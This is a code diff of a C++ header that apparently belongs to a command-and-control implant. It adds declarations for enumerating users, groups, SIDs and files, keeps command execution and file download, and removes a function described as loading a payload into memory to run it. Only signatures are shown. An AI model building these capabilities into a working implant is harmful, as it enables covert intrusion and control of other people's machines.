@@ -5,6 +5,8 @@
 #include <winhttp.h>
 #include <fstream>
 #include <iterator>
+#include <lm.h>
+#include <sddl.h>
 #include <sstream>
 #include <string>
 #include <strsafe.h>
@@ -31,13 +33,21 @@ namespace System::Fs
         LPOVERLAPPED lpOverlapped
     );
 
+
     struct MyFileData {
     LPVOID lpData;
     DWORD dwDataSize;
     };
 
+    std::wstring GetAbsolutePath(const std::wstring& wPath);
+    std::vector<std::wstring> GetFilesInDirectory(const std::wstring& wDirPath, BOOL bRecurse);
     std::vector<char> ReadBytesFromFile(const std::wstring& wFilePath);
-    BOOL MyWriteFile(const std::wstring& wFile, LPCVOID lpData, DWORD dwDataSize);
+    BOOL MyWriteFile(const std::wstring& wFilePath, LPCVOID lpData, DWORD dwDataSize);
+}
+
+namespace System::Group
+{
+    std::vector<std::wstring> GetAllGroups();
 }
 
 namespace System::Http
@@ -72,17 +82,9 @@ namespace System::Http
         DWORD dwDataLength
     );
 
-    // It's used for reading small text from responses.
+    std::vector<BYTE> ReadResponseBytes(HINTERNET hRequest);
     std::wstring ReadResponseText(HINTERNET hRequest);
-
-    // It's used for reading large data from responses.
-    // The data is saved at 'sFile'.
-    BOOL ReadResponseData(HINTERNET hRequest, const std::wstring& outFile);
-
-    // It's used for loading another payload into memory
-    // and execute it.
-    BOOL ReadResponsePayload(HINTERNET hRequest);
-
+    BOOL WriteResponseData(HINTERNET hRequest, const std::wstring& outFile);
     BOOL DownloadFile(
         HINTERNET hConnect,
         LPCWSTR lpHost,
@@ -107,6 +109,13 @@ namespace System::Process
 {
     std::wstring ExecuteCmd(const std::wstring& cmd);
     BOOL ExecuteFile(const std::wstring& filePath);
+}
+
+namespace System::User
+{
+    std::wstring GetAccountName(); // retrieves computer name and username.
+    std::wstring GetSID();
+    std::vector<std::wstring> GetAllUsers();
 }
 
 #endif // HERMIT_CORE_SYSTEM_HPP
